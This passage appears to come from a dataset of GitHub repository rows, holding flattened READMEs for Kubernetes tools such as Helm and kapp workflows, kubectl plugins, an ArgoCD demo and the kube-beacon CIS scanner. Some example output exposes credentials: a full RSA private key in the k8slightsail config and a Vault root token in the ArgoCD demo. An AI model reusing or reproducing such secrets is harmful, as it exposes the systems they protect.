reproducible install Chart yaml values yaml demo service repository example application build sh build and push the image Dockerfile kbld yaml defines what image is build and where to push it umbrella chart describe the preview environment optional Prerequisites helm https helm sh Package manager kbld https github com k14s kbld Image building and image pushing kapp https github com k14s kapp Deployment tool kpt https googlecontainertools github io kpt reference pkg Fetch update and sync configuration files using git kubeval https github com instrumenta kubeval optional Validate your Kubernetes configuration files kube score https github com zegl kube score optional Static code analysis sops https github com mozilla sops optional Secret encryption Helm introduction Helm https helm sh is the package manager for Kubernetes It provides an interface to manage chart dependencies Helm guaranteed reproducible builds if you are working with the same helm values Because all files are checked into git we can reproduce the helm templates at any commit Dependency Management helm dependency build Rebuild the charts directory based on the Chart lock file helm dependency list List the dependencies for the given chart helm dependency update Update charts based on the contents of Chart yaml Helm allows you to manage a project composed of multiple microservices with a top level umbrella chart https helm sh docs howto chartstipsandtricks complex charts with many dependencies You can define global https helm sh docs charttemplateguide subchartsandglobals global chart values chart values that are accessible in all sub charts Chart distribution Chart Repository In big teams sharing charts can be exhausting tasks In that situation you should think about a solution to host your own Chart Repository You can use chartmuseum https github com helm chartmuseum S3 The simpler approach is to host your charts on S3 and use the helm plugin S3 https github com hypnoglow helm s3 to make them manageable with the helm cli kpt There is another very interesting approach to share charts or configurations in general Google has developed a tool called kpt https googlecontainertools github io kpt One of the features is to sync arbitrary files subdirectories from a git repository You can even merge upstream updates This makes it very easy to share files across teams without working in multiple repositories at the same time The solution would be to fetch a list of chart repositories and store them to umbrella charts and call helm build Your Chart yaml dependencies must be prefixed with file sh fetch team B order service subdirectory kpt pkg get https github com myorg charts order service VERSION umbrella chart charts order service lock dependencies helm build make changes merge changes and tag that version in the remote repository kpt pkg update umbrella chart charts order service gNEWVERSION strategy resource merge Distribute configurations with containers With kpt fn https googlecontainertools github io kpt reference fn you can generate transform and validate configuration files from images starlark scripts or binary executables The command below will provide DIR as an input to a container instance of gcr io example com my fn executing the function in it and store the output in charts order service This has great potential to align your tooling with containers DOCKER all the things sh run a function using explicit sources and sinks kpt fn source DIR kpt fn run image gcr io example com my fn kpt fn sink charts order service Advanced templating Sometimes helm is not enough This can have several reasons The external chart isn t flexible enough You want to keep base charts simple You want to abstract environments In that case you can use tools like kustomize https github com kubernetes sigs kustomize or ytt https github com k14s ytt sh this approach allows you to patch specific files because file stucture is preserved helm template my app umbrella chart output dir release this requires a local kustomize yaml kustomize build release or with ytt this will template all files and update the original files helm template my app umbrella chart output dir release ytt f release ignore unknown comments output files release heavycheckmark Helm solves X Build an application composed of multiple components X Manage dependencies X Distribute configurations The application repository If you practice CI you will test build and deploy new images continuously in your CI Every build produces an immutable image tag that must be replaced in your helm manifests In order to automate and standardize this process we use kbld https github com k14s kbld kbld handles the workflow for building and pushing images In your pipeline you need to run demo service repository build sh This command will build and push the image and outputs a demo service kbld lock file This file must be committed to the config repository app locks to ensure that every deployment reference to the correct images This procedure will trigger the CI in the config repository and allows you to practice Continues Deployment Define your application images Before we can build images we must create some sources and image destinations so that kbld is able to know which images belong to your application They are managed in the application repository demo service repository kbld yaml They look like CRD s but they aren t applied to your cluster The config repository The directory config repository release refers to the temporary desired state of your cluster It s generated on your CI pipeline The folder contains all kubernetes manifest files Release snapshot This command will prerender your umbrella chart to config repository release state yaml builds and push all necessary images and replace all image references in your manifests It s important to note that no image is built in this step We reuse all prerendered images references from app locks The result is a snapshot of your desired cluster state at a particular commit The CD pipeline will deploy it straight to your cluster sh config repository render sh heavycheckmark kbld solves X One way to build tag and push images X Agnostic to how manifests are generated X Desired system state versioned in Git X Every commit points to a specific image configuration of all maintained applications Deployment We use kapp https github com k14s kapp to deploy our resources to kubernetes Kapp ensures that all resources are properly installed in the right order It provides an enhanced interface to understand what has really changed in your cluster If you want to learn more you should check the homepage https get kapp io sh config repository deploy sh informationsource Kapp takes user provided config as the only source of truth but also allows to explicitly specify that certain fields are cluster controlled This method guarantees that clusters don t drift which is better than what basic 3 way merge provides Source https github com k14s kapp issues 58 issuecomment 559214883 Clean up resources If you need to delete your app You only need to call config repository delete sh This comes handy if you need to clean up resources on dynamic environments heavycheckmark kapp solves X One way to diffing labeling deployment and deletion X Agnostic to how manifests are generated Environment Management In order to manage multiple environments like development and staging you can create different branches Every branch has a different set of image references stored in config repository app locks and values for your helm charts Secret Management sops You can use sops https github com mozilla sops to encrypt yaml files The files must be encrypted before they are distributed in helm charts In the deployment process you can decrypt them with a single command Sops support several KMS services Hashicorp Vault AWS Secrets Manager etc bulb CI solutions are usually shipped with a secret store There you can store your certificate to encrypt the secrets sh As a chart maintainer I can encrypt my secrets with find release name secret exec sops e i Before deployment I will decrypt my secrets so kubernetes can read them kapp deploy n default a my app f sops d umbrella state state yaml Rollback Releasing The big strength of GitOps is that any commit represent a releasable version of your infrastructure setup Controller Where kubernetes controller really show its strength is locality They are deployed in your cluster and are protected by their environment We can use that fact and deploy a controller like secretgen controller https github com k14s secretgen controller which is responsible to generate secrets on the cluster secretgen controller works with CRD s In that way the procedure to generate the secret is stored in git but you can t run into the situation where you accidentally commit your password You will never touch the secret Closing words The hardest thing about running on Kubernetes is gluing all the pieces together You need to think more holistically about your systems and get a deep understanding of what youre working with Chris Short checkeredflag As you can see the variety of tools is immense The biggest challenge is to find the right balance for your organization The proposed solution is highly opinionated but it tries to solve common problems with new and established tools I placed particular value on a solution that doesn t require server components I hope this guide will help organization startups to invest in kubernetes Feel free to contact me or open an issue Demo Check out the demo demo to see how it looks like More Combine helm with kustomize https github com thomastaylor312 advanced helm demos tree master post render Skaffold an alternative to kbld kapp https github com GoogleContainerTools skaffold Managing Applications in Production Helm vs ytt kapp https www youtube com watch v WJw1MDFMVuk References k14s kubernetes tools https tanzu vmware com content blog introducing k14s kubernetes tools simple and composable tools for application deployment why is a pull vs a push pipeline important https www weave works blog why is a pull vs a push pipeline important The best CI CD tool for kuberneets doesn t exist https thenewstack io the best ci cd tool for kubernetes doesnt exist,2020-10-04T10:13:50Z,2020-12-25T12:17:55Z,n/a,User,2,10,0,124,main,StarpTech,1,0,0,0,0,0,0
zzxap,k8sclient,,k8sclient k8sclient manage k8s deployment service ingress pod node rum yaml can add update delete view deployment service ingress on web unzip release zip cd release unzip KubersClient zip chmod 771 KubersClient run KubersClient run this in k8s master host and then open http ip 8081 web namespace password and username config in config int deployment service ingress node pod Docker k8s release zip release KubersClient zip chmod 771 KubersClient k8s KubersClient node http ip 8081 web namespace config ini config ini K8S image https github com zzxap k8sclient blob master png 13 PNG raw true image https github com zzxap k8sclient blob master png 12 PNG raw true image https github com zzxap k8sclient blob master png 10 PNG raw true image https github com zzxap k8sclient blob master png 9 PNG raw true image https github com zzxap k8sclient blob master png 9 PNG raw true image https github com zzxap k8sclient blob master png 7 PNG raw true image https github com zzxap TraefikUI blob master images wechat jpg raw true,2020-09-03T10:00:47Z,2020-11-04T06:20:02Z,n/a,User,1,10,1,51,master,zzxap,1,0,10,0,0,0,0
k0mn3,k8s-42-session-setup,,k8s 42 session setup This script allow you to install all necessary tools for ft services project in goinfre without running out of space Check first if VirtualBox is installed in your session run setup sh,2020-11-06T17:47:03Z,2020-12-26T17:46:54Z,Shell,User,1,10,0,16,main,k0mn3,1,0,0,0,0,0,0
dodopizza,kubectl-shovel,infra-services#kubectl-plugins#kubernetes#toil-elimination#utility,kubectl shovel Testing and publishing https github com dodopizza kubectl shovel workflows Testing 20and 20publishing badge svg https github com dodopizza kubectl shovel actions Go Report Card https goreportcard com badge github com dodopizza kubectl shovel https goreportcard com report github com dodopizza kubectl shovel FOSSA Status https app fossa com api projects custom 2B20998 2Fgit 40github com 3Adodopizza 2Fkubectl shovel git svg type shield https app fossa com projects custom 2B20998 2Fgit 40github com 3Adodopizza 2Fkubectl shovel git ref badgeshield GitHub Release https img shields io github release dodopizza kubectl shovel svg style flat https github com dodopizza kubectl shovel releases Plugin for kubectl that will help you to gather diagnostic info from running in Kubernetes dotnet applications It can work with NET Core 3 0 applications and Kubernetes clusters with docker runtime At the moment the following diagnostic tools are supported dotnet gcdump dotnet trace Inspired by kubectl flame https github com VerizonMedia kubectl flame Installation Krew You can install kubectl shovel via krew https krew sigs k8s io At first install krew if you don t have it yet following the guide Installing https krew sigs k8s io docs user guide setup install Then you will be able to install shovel plugin kubectl krew install shovel Precompiled binaries You can find latest release on repository release page https github com dodopizza kubectl shovel releases Once you download compatible with your OS binary move it to any directory specified in your PATH Usage Feel free to use it as a kubectl plugin or standalone executable kubectl shovel kubectl shovel Get gcdump shell kubectl shovel gcdump pod name pod name 74df554df7 qldq7 o dump gcdump Or trace shell kubectl shovel trace pod name pod name 74df554df7 qldq7 o trace nettrace You can find more info and examples in cli documentation cli docs kubectl shovel md or by using h help flag How it works It runs the job with specified tool on the specified pod s node and mount its tmp folder with dotnet diagnostic socket So it requires permissions to get pods and create jobs and allowance to mount var lib docker path from a host in read only mode,2020-09-04T08:06:03Z,2020-11-25T20:53:12Z,Go,Organization,6,10,0,29,master,StupidScience#s-buhar0v,2,1,1,1,0,1,0
dastergon,kubectl-janitor,k8s#krew#krew-plugin#kubectl#kubectl-plugin#kubectl-plugins#kubernetes#kubernetes-cluster#kubernetes-troubleshooting,kubectl janitor Build Status https github com dastergon kubectl janitor workflows ci badge svg https github com dastergon kubectl janitor workflows ci Go Report Card https goreportcard com badge dastergon kubectl janitor https goreportcard com report dastergon kubectl janitor LICENSE https img shields io github license dastergon kubectl janitor svg https github com dastergon kubectl janitor blob master LICENSE Releases https img shields io github release pre dastergon kubectl janitor svg https github com dastergon kubectl janitor releases kubectl janitor is a kubectl plugin that assists in finding objects in a problematic state in your Kubernetes cluster Introduction Troubleshooting Kubernetes clusters sometimes requires a combination https learnk8s io troubleshooting deployments of kubectl commands and other command line tools such as jq https github com stedolan jq to do correlations around the issues that the various objects might have Moreover sometimes the supported options of the field selector flag might be limited https github com kubernetes kubernetes issues 49387 During troubleshooting scenarios people need to identify the issues quickly without worrying about remembering all the different command combinations The primary goal of this plugin is to collect some commonly executed kubectl command patterns to identify objects in a problematic state in the cluster and reduce the cognitive load for people troubleshooting Installing Krew You can install kubectl janitor using the Krew https github com kubernetes sigs krew the package manager for kubectl plugins Once you have Krew installed https krew sigs k8s io docs user guide setup install run the following command kubectl krew install janitor Releases Check the release https github com dastergon kubectl janitor releases page for the full list of pre built assets Install 1 Download one of the releases that are compatible with your os arch 2 Unzip to get kubectl janitor 3 Add it to your PATH or move it to a path already in in PATH i e usr local bin Source go get u github com dastergon kubectl janitor cmd kubectl janitor This command will download and compile kubectl janitor Usage To get the full list of commands with examples kubectl janitor Features List Pods that are in a pending state waiting to be scheduled kubectl janitor pods unscheduled List Pods in an unhealthy state kubectl janitor pods unhealthy List Pods that are currently running but not ready for some reason kubectl janitor pods unready List the current statuses of the Pods and their respective count kubectl janitor pods status List Jobs that have failed to run and have restartPolicy Never kubectl janitor jobs failed List PesistentVolumes that are available for claim kubectl janitor pvs unclaimed List PersistentVolumeClaims in a pending state unbound kubectl janitor pvcs pending You can use the A or all namespaces flag to search for objects in all namespaces You can use the no headers flag to avoid showing the column names Cleanup If you have installed the plugin via the krew command You can remove the plugin by using the same tool kubectl krew uninstall kubectl janitor Or you can uninstall this plugin from kubectl by simply removing it from your PATH rm usr local bin kubectl janitor Author Pavlos Ratis dastergon https twitter com dastergon License Apache 2 0 LICENSE,2020-12-05T18:41:44Z,2020-12-29T00:53:52Z,Go,User,1,10,0,3,main,dastergon,1,1,1,0,0,0,0
atoy3731,k8s-tools-app,,Demo App ArgoCD Umbrella App This repository contains the ArgoCD App of Apps GitOps pattern to automatically provision a cluster with the following resources Cert Manager https cert manager io docs Allows a dynamic and automated way to provision and refresh SSL certificates using LetsEncrypt Rancher https rancher com docs rancher v2 x en A cluster Kubernetes resource and management tool It gives you a visual UI into your cluster and workloads and allows access without a terminal Banzai Bank Vault https github com banzaicloud bank vaults Gives you a way to both store secrets encrypted and reference those encrypted secrets within Pods at run time so applications have access to them Prerequisites and Links This repository assumes you already have the following installed Kubernetes ArgoCD Kubectl CLI Vault CLI Please reference the aws k8s terraform https github com atoy3731 aws k8s terraform project to spin up an entire functioning K3S cluster onto AWS with ArgoCD using Terraform What is All This Stuff ArgoCD best practices say to follow an app of app pattern to deploy your applications If you look at the umbrella tools yaml file this is your parent application that will host all other applications inside of it Within that file you ll see this snippet yaml source path resources tools repoURL https github com atoy3731 k8s tools app git targetRevision master What this is telling ArgoCD is 1 Use the https github com atoy3731 k8s tools app git git repository 2 Check out the master branch 3 Go to the resources tools directory ArgoCD supports flat manifests Kustomize and Helm for manifest compilation We utilize both Kustomize and Helm within this project If you look at the resources tools resources directory you ll see a number of other Application custom resources that follow a similar pattern to the parent project These follow the same workflows Sync Waves Another awesome feature of ArgoCD is Sync Waves This allows you to synchronously deploy things in a specific order just by attaching an annotation For instance you need to deploy Cert Manager before you deploy Rancher so you can set this annotation within your cert manager Argo Application yaml apiVersion argoproj io v1alpha1 kind Application metadata name cert manager namespace kube system annotations argocd argoproj io sync wave 4 And this annotation for Rancher yaml apiVersion argoproj io v1alpha1 kind Application metadata name rancher namespace kube system annotations argocd argoproj io sync wave 3 Since cert manager s sync wave 4 is lesser than rancher s 3 it will deploy first NOTE Sync waves range from 5 to 5 and follow that order So How Do I Deploy This This repo is set up for a demo so you ll need to do the following to make it work for you 1 If you ve forked cloned this repository you ll need to do a global find replace for https github com atoy3731 k8s tools app git and change it to your new repository 2 If this is exposed to the world via a domain you own you ll need to make a wildcard CNAME DNS entry to point to the AWS ELB hostname that was created from your aws k8s terraform cluster For instance I have demo atoy dev pointing to a1ec6aaa9d97d4774975811481c12472 959947491 us east 1 elb amazonaws com This will route all traffic to Kubernetes and let the Traefik ingress controller route based on the incoming hostname 3 In resources tools resources other resources yaml change the argoHost and issuerEmail to your domain name and email 4 In resources apps resources hello world yaml change the 2 references to app demo atoy dev to your domain Now you re ready to deploy Run the following command bash kubectl apply f umbrella tools yaml And Ta Da your entire cluster should be provisioning It will take a minute or two for the ArgoCD ingress to provision but assuming things are set up you should be able to navigate to it For me I go to http argo demo atoy dev NOTE If you don t have a domain that you own and still want to see ArgoCD you can run the following xslt kubectl port forward svc argocd server 8080 80 n kube system Now you should be able to go to http localhost 8080 in your browser and get to Argo OTHER NOTE ArgoCD s username is admin and password is the name of the argocd server pod running within kube system To get this run the following xslt kubectl get pods n kube system grep argocd server awk print 1 Creating Vault Secrets For secrets within Vault I prefer using the UI To access to the UI run the tools vault config sh command once your vault is up and running It ll output something similar Your Vault root token is s nSSIIdCRZE6wA4wAaRVWaq03 Run the following export VAULTTOKEN s nSSIIdCRZE6wA4wAaRVWaq03 export VAULTCACERT Users adam toy vault ca crt kubectl port forward n vault service vault 8200 You will then be able to access Vault in your browser at http localhost 8200 1 Navigate to http localhost 8200 http localhost 8200 and enter your token 2 Once you re logged in click on the secret engine and click Create Secret in the upper right 3 On the form in the Path for this secret box put demo 4 Add a key value under Version Data that matches DEMOSECRET vault secured secret 1234 5 Click Save Congrats you ve created an encrypted secret that is stored in Vault Deploy the Demo App Now we re going to deploy the Demo App Run the following kubectl apply f umbrella apps yaml That should kick off another umbrella app that will contain a single sub application It is a Python application that will output the above Vault secret to its logs and show you the hostname IP of the pod in the browser If you want to see the source of the application it is here https github com atoy3731 hello world app Its Kubernetes manifests are here https github com atoy3731 hello world manifests Anything Else These are on my road map for other things to add to this Istio Service Mesh ELK Stack I m open to suggestions,2020-10-17T19:05:50Z,2020-12-28T19:44:47Z,HTML,User,2,9,7,1,master,atoy3731,1,0,0,0,0,0,0
imrenagi,google-secret-k8s,,Google Secret Kubernetes Kubernetes based CRD and controller for synchronizing google secret manager data to application runs on kubernetes This makes Google Secret Manager as the first class citizen of Kubernetes Credits This project is inspired by Hashicorp s vault k8s https github com hashicorp vault k8s project This project uses some code components from that repository However it is used to fetch secret from Google Secret Manager instead of Vault This project creates a kubernetes controller and an operator named GoogleSecretEntry to store these informations 1 Kubernetes Secret name and the key used to store base64 encoded string of GCP service account key 1 Path to the secret in Google Secret Manager https cloud google com secret manager and the name of the file where the secret will be written in the Pod s mounted memory Besides that controller this project creates another RESTful service which uses Kubernetes Admission Controller https kubernetes io blog 2019 03 21 a guide to kubernetes admission controllers feature to intercept the creation of an Pod and mutate the pod definition to add an init container admission controller https d33wubrfki0l68 cloudfront net af21ecd38ec67b3d81c1b762221b4ac777fcf02d 7c60e images blog 2019 03 21 a guide to kubernetes admission controllers admission controller phases png This init container later is used to fetch the credentials from Google Secret Manager and store it to google secrets directory by default This removes the user needs to put logics to fetch the secret from the code application flow docs img application flow png Installation bash kubectl create namespace secret operator system helm install gsecret k8s charts gsecret k8s namespace secret operator system Usage As Google Cloud authenticates the client by using service account and its json key We need to create a Kubernetes Secret to store this information Assuming that you are creating a Secret name mysecret whose data with sa key json and base64 encoded values of the service account key yaml apiVersion v1 kind Secret metadata name mysecret namespace default type Opaque data sa key json Run bash kubectl apply f mysecret yaml Create a GoogleSecretEntry Custom Resoruce to store the reference to the secret created on previous steps and list of secret path you want to fetch for the application The example below shows that you will fetch a secret stored in Google Secret Manager with path projects imre demo secrets dbcreds versions latest and then store the data to a file name db creds in directory named google secrets on the application container yaml apiVersion secret security imrenagi com v1alpha1 kind GoogleSecretEntry metadata name googlesecretentry sample namespace default spec secretRef name mysecret namespace default key sa key json secrets path projects imre demo secrets dbcreds versions latest name db creds Run bash kubectl apply f googlesecretentry yaml Bind this role to Kubernetes ServiceAccount you use for your applications To learn more about RoleBinding take a look here https kubernetes io docs reference access authn authz rbac rolebinding and clusterrolebinding This RoleBinding is necessary since the init container will have to do GET call to Kubernetes API to retrieve the Secret and GoogleSecretEntry yaml apiVersion rbac authorization k8s io v1 kind Role metadata name gsecret agent role labels app kubernetes io name static web rules apiGroups resources secrets verbs get apiGroups secret security imrenagi com resources googlesecretentries verbs get list watch apiGroups secret security imrenagi com resources googlesecretentries status verbs get Add the following extra annotations to your pods For complete example take a look this file agent inject sample pod yaml yaml apiVersion v1 kind Pod metadata annotations google secret security imrenagi com agent inject true google secret security imrenagi com agent google secret crd googlesecretentry sample Run bash kubectl apply f pod yaml Once the pod is created you should see the pod starts with an init container To see all supported annotations please refer to this file agent inject injector agent annotations go The annotations above are used by the agent injector to decide whether to mutate the Pod definition with additional an init container This init container will fetch the secret defined from Google Secret Manager before your application starts,2020-08-26T00:15:06Z,2020-11-30T12:32:13Z,Go,User,1,9,4,25,master,imrenagi,1,0,0,0,0,0,0
chen-keinan,kube-beacon,audit-checks#cis-benchmark#cis-kubernetes-benchmark#cis-security#k8s#kube#kube-beacon#kube-bench#kube-scan#kubernetes#scan,Go Report Card https goreportcard com badge github com chen keinan beacon https goreportcard com report github com chen keinan beacon License https img shields io badge License Apache 202 0 blue svg https github com chen keinan beacon blob main LICENSE Build Status https travis ci com chen keinan kube beacon svg branch main https travis ci com chen keinan kube beacon Coverage Status https coveralls io repos github chen keinan kube beacon badge svg branch main https coveralls io github chen keinan kube beacon branch main Gitter https badges gitter im kube beacon community svg https gitter im kube beacon community utmsource badge utmmedium badge utmcampaign pr badge Kube Beacon Project Scan your kubernetes runtime Kube Beacon is an open source audit scanner who perform audit check on a deployed kubernetes cluster and output a security report The audit tests are the full implementation of CIS Kubernetes Benchmark specification https www cisecurity org benchmark kubernetes Audit checks are performed on master and worker nodes and the output audit report include root cause of the security issue proposed remediation for security issue kubernetes cluster audit scan output k8s audit pkg images beacon gif Installation installation Quick Start quick start Kube beacon as Docker Kube beacon as Docker Kube beacon as pod in k8s Kube beacon as pod in k8s Next steps Next steps Installation sh git clone https github com chen keinan kube beacon cd kube beacon make install Note kube beacon require root user to be executed Quick Start Execute kube eacon without any flags execute all tests kube beacon Execute kube beacon with flags execute test on demand Usage kube Beacon version help Available commands are r report run audit tests and generate failure report i include execute only specific audit test example i 1 2 3 1 4 5 e exclude ignore specific audit tests example e 1 2 3 1 4 5 n node execute audit tests on specific node example n master n worker s spec execute specific audit tests spec example s gke default k8s v version execute specific audit tests spec version example v 1 1 0 default 1 6 0 Execute tests and generate failure tests report kube beacon r Kube beacon as Docker Execute kube beacon via docker docker run pid host v etc etc ro v var var ro v cni cni v HOME kube root kube ro v which kubectl usr bin kubectl t kbeacon jfrog io docker local kube beacon Kube beacon as pod in k8s Execute kube beacon as a pod in k8s cluster Add cluster role binding with role cluster admin kubectl create clusterrolebinding default admin clusterrole cluster admin serviceaccount default default cd jobs simple k8s cluster run following job kubectl apply f k8s yaml gke cluster run the following jon kubectl apply f gke yaml Check k8s pod status kubectl get pods all namespaces NAMESPACE NAME READY STATUS RESTARTS AGE default kube beacon sc8g9 0 1 Completed 0 111s kube system event exporter gke 8489df9489 skcvv 2 2 Running 0 7m24s kube system fluentd gke 7d5sl 2 2 Running 0 7m6s kube system fluentd gke f6q5d 2 2 Running 0 6m59s Check k8s pod audit output kubectl logs kube beacon sc8g9 cleanup remove role and delete pod kubectl delete clusterrolebinding default admin kubectl delete f k8s yaml Next steps add eks support integration with terraform post scan hooks,2020-10-05T17:42:54Z,2020-12-29T10:36:38Z,Go,User,2,9,3,164,main,chen-keinan#dkeler,2,0,0,0,0,0,2
vleedev,k8slightsail,,k8slightsail Description This tool is used for provisioning kubernetes k8s cluster base on lightsail service of AWS It s just using for lab k8s Provision when you need delete it when you dont need to save money Number of master depend on your choice Number of worker depend on your choice Loadbalancing 1 Some tools are preinstalled Master systemd is preconfigured kubeadm containerd curl kubectl kubelet nfs common open iscsi Worker systemd is preconfigured kubeadm containerd curl kubelet nfs common open iscsi Loadbalancing curl haproxy Tested Ubuntu 20 04 LTS Install golang compiler https golang org Install this app go install Run Init cluster k8slightsail up config yml file is going to be created automatically like region ap northeast 1 nodes name k8s master 8674665223082153552 type master zone ap northeast 1a username ubuntu publicip 18 183 224 164 privateip 172 26 11 256 name k8s master 6129484611666145822 type master zone ap northeast 1c username ubuntu publicip 175 41 232 63 privateip 172 26 16 44 name k8s master 4037200794235010052 type master zone ap northeast 1d username ubuntu publicip 13 230 39 207 privateip 172 26 43 48 name k8s loadbalancing 3916589616287113938 type loadbalancing zone ap northeast 1a username ubuntu publicip 13 115 118 175 privateip 172 26 15 164 name k8s worker 6334824724549167321 type worker zone ap northeast 1c username ubuntu publicip 54 249 173 204 privateip 172 26 20 230 name k8s worker 605394647632969759 type worker zone ap northeast 1d username ubuntu publicip 52 195 19 202 privateip 172 26 33 174 name k8s worker 1443635317331776149 type worker zone ap northeast 1a username ubuntu publicip 54 238 182 222 privateip 172 26 7 185 name k8s worker 894385949183117217 type worker zone ap northeast 1c username ubuntu publicip 18 183 47 62 privateip 172 26 29 169 name k8s worker 2775422040480279450 type worker zone ap northeast 1d username ubuntu publicip 3 112 110 17 privateip 172 26 39 114 sshkeypairname sshkey 5577006791947779411 sshprivatekey BEGIN RSA PRIVATE KEY MIICXQIBAAKBgQCyJ5onfJVLZmRGq7Jdm9ujdEC97snUL12qA7JS6YBOPGELeroe UGaTEqj5Ib0rhR J7mOIVNKHrS gmkVMe4vCNiiCtU1zROVQ9TdF6U9CvY7PUQlD dow778mW6RSQ1MZkcXsTSbSGdIBhPDV0mz71dipxoLuTAz6ckGfHzgGapQIDAQAB AoGBAIVYSPS3NhOajwGqb7XK 6mrUO4Yte5giY3AeI AgC2O2eA6uuYHrc71T44x Z6MUYBfgW5VmT7IHuec18Rqe mpiANlEmfYrZigS Xu4S7PMCJpTv09KuA NuXVD XPp5S oyuOyX Yarus2H4r7lcOU9vLlAlmqYHluUCi5E6Wi9AkEA4IXwOWezGGFP mqauTZ1CFeCirby1S0qNUcFLHE5f4IV29lHy NNDg2g mCqItREiLK6UiaPuhQFT HHAq hmg1wJBAMshg5OcVqBHQrwaJEXagsByaVd3RXm8V9WR6sb8N7IHmJffxLxw j MgjUzJj9Jz7oavd7ZnkCBbnCi 0PqsZOMCQAnOD5WSL8IKzd0lFkuRaIdoDfKk YQ5urQk69brAuXMmoPFU1tWC9FnSvZkLknjFzMZCwX3ZSNtKGYUOaPIPGHUCQCid muF48Rk7JmzWDUqqVlqEheunPY0Jy8Y4VulSpRBD1I8JfxzupNnIOHiSFN PrnHf w AE9RyDNMYxFGgK8GECQQC0p1SPTLqkZaU4ZmM1o7BI 8YEMXPPI2NUK2w6hR4h s6YYyJvlc tKsJX KkGP6yO24kd yk4mRMaA0X9NAGG END RSA PRIVATE KEY sshpublickey ssh rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQCyJ5onfJVLZmRGq7Jdm9ujdEC97snUL12qA7JS6YBOPGELeroeUGaTEqj5Ib0rhR J7mOIVNKHrS gmkVMe4vCNiiCtU1zROVQ9TdF6U9CvY7PUQlDdow778mW6RSQ1MZkcXsTSbSGdIBhPDV0mz71dipxoLuTAz6ckGfHzgGapG List k8slightsail ls Play with SSH k8slightsail ssh Next step Config your loadbalancer with IP masters as layer 4 Init k8s cluster at master node with control lane IP loadbalancer IP Delete cluster k8slightsail down,2020-11-23T15:35:00Z,2020-12-25T15:08:51Z,Go,User,1,9,0,20,main,vleedev#minhtuanly,2,0,0,0,0,0,0
ti-community-infra,ti-community-prow,cd#ci#k8s#k8s-cluster#make#prow#test-infra#ti-community-prow,ti community prow go report card https goreportcard com badge github com ti community infra ti community prow go report card https goreportcard com report github com ti community infra ti community prow GitHub Actions https github com ti community infra ti community prow workflows Test badge svg branch master https github com features actions codecov https codecov io gh ti community infra ti community prow branch master graph badge svg https codecov io gh ti community infra ti community prow version https img shields io github release ti community infra ti community prow all svg Prow https github com kubernetes test infra tree master prow is a Kubernetes based CI CD system This repository contains tools and configuration files for the testing and automation needs for tidb community,2020-09-19T08:42:34Z,2020-12-29T08:48:30Z,Go,Organization,3,9,7,205,master,hi-rustin#Mini256#andylokandy,3,46,46,8,23,2,205
networkop,k8s-networking-guide,,,2020-09-13T16:59:51Z,2020-12-27T08:14:31Z,HTML,User,2,9,1,34,master,networkop#hellt#idoqo,3,0,0,1,1,0,3
gjtempleton,k8s-autoscaling-by-example,,k8s autoscaling by example A basic walkthrough of kubernetes autoscaling in all its forms What is this repo This repo is intended to give a hands on overview of autoscaling in Kubernetes k8s allowing users to see the role each component plays and how they can impact the scaling of their workloads and or clusters It will make use of a local Kind Cluster to walk users through deploying and scaling workloads Creating a local Kind Cluster If you have access to a test cluster of some other type you may skip this step just ensure your command line and context are set up against the cluster you intend to use though depending on how this is set up some of the below components may already be set up for you If you don t already have a test cluster then follow the latest instructions https github com kubernetes sigs kind installation and usage for setting up and running a Kind Cluster Once you have this set up you should successfully be able to run commands like bash kubectl get nodes NAME STATUS ROLES AGE VERSION kind control plane Ready master 39m v1 17 0 API Aggregation Kubernetes does its job by making use of a wide range of APIs allowing for API versioning and many other clever pieces of work Most of the time these are opaque to Cluster users until they run into a deprecated API for instance Their kubectl top node commands hiding the API behind it making requests to apis metrics k8s io v1beta1 nodes and interpreting the response for the user In most cases these APIs are served by the API server If you run bash kubectl get apiservices apiregistration k8s io you will see a table of all of the APIs known by the k8s APIServer whether they are available when k8s first knew about them and which service is responsible for that API Here local means that the cluster s APIServer will route the request via itself Kubernetes provides three core metrics APIs resource these are the memory and CPU utilisation metrics you see when running kubectl top against either Nodes or Pods They re served under the apis metrics k8s io API path custom these are metrics that correspond to a kubernetes object but are not a resource metric These can be arbitrary metrics as long as they correspond in a 1 1 mapping to a kubernetes object like Pods in a scale target or a connected Ingress object external these are metrics that are entirely external to a kubernetes object but may neverless be a metric you want to scale on They re served under the apis external metrics k8s io API path These APIs are referred to collectively as the metrics apis To begin with a cluster will by default have no components to serve any of these metrics This means that when you run bash kubectl get apiservices apiregistration k8s io you won t see any components serving any of metrics k8s io custom metrics k8s io or external metrics k8s io Demos This repo is intended to provide hands on demonstrations of each component of autoscaling in Kubernetes horizontal vertical and eventually cluster To follow the demos change your working directory into each of the sub directories in order and follow the hands on experiments in their README md All feedback welcome,2020-12-06T20:18:06Z,2020-12-20T19:30:26Z,Python,User,1,9,1,3,main,gjtempleton,1,0,0,1,0,0,0
redhat-actions,oc-installer,action#cloud#k8s#kubernetes#oc#openshift#redhat,oc installer oc installer Test https github com redhat actions oc installer workflows oc installer 20Test badge svg https github com redhat actions oc installer actions query workflow 3A 22oc installer Test 22 Verify Bundle https github com redhat actions oc installer workflows Verify 20Bundle badge svg https github com redhat actions oc installer actions query workflow 3A 22Verify Bundle 22 tag badge https img shields io github v tag redhat actions oc installer https github com redhat actions oc installer tags license badge https img shields io github license redhat actions oc installer LICENSE size badge https img shields io github size redhat actions oc installer dist index js dist oc installer installs the OpenShift Client CLI oc https github com openshift oc onto your GitHub Action runner Note that GitHub s Ubuntu Environments https github com actions virtual environments available environments come with oc 4 6 installed So if you are using one of those environments and do not require a different oc version this action is not necessary for your workflow Once oc is present use oc login https github com redhat actions oc login to log into the cluster and set up a Kubernetes context Inputs The action has one input ocversion If not specified it defaults to latest The ocversion can be latest the default to use the latest stable release An existing oc version For example 4 6 or 3 11 173 The version must exist on our public download site Refer to the download sites for v3 https mirror openshift com pub openshift v3 clients and v4 https mirror openshift com pub openshift v4 clients oc This type of version is required to use the caching feature how the cache works A URL from which to download oc Example Also see this repository s workflows github workflows yaml steps name Install oc uses redhat actions oc installer v1 with version 4 6 Now oc is available for the rest of these steps Proxy Support If you need a self hosted runner to communicate via a proxy server you can use one of the following methods as described in the GitHub Actions documentation https help github com en actions hosting your own runners using a proxy server with self hosted runners Configuring a proxy server using environment variables HTTPSPROXY HTTPPROXY Using an env file to set the proxy configuration How the Cache Works oc installer caches the oc executable to avoid downloading the same executable multiple times when running different jobs The cache is only enabled when the version input is specified as a semantic version in the task If the version is latest or a URL the cache is not used The oc executable will be cached inside the work tool oc folder Contributing This is an open source project open to anyone This project welcomes contributions and suggestions Feedback Questions If you discover an issue please file a 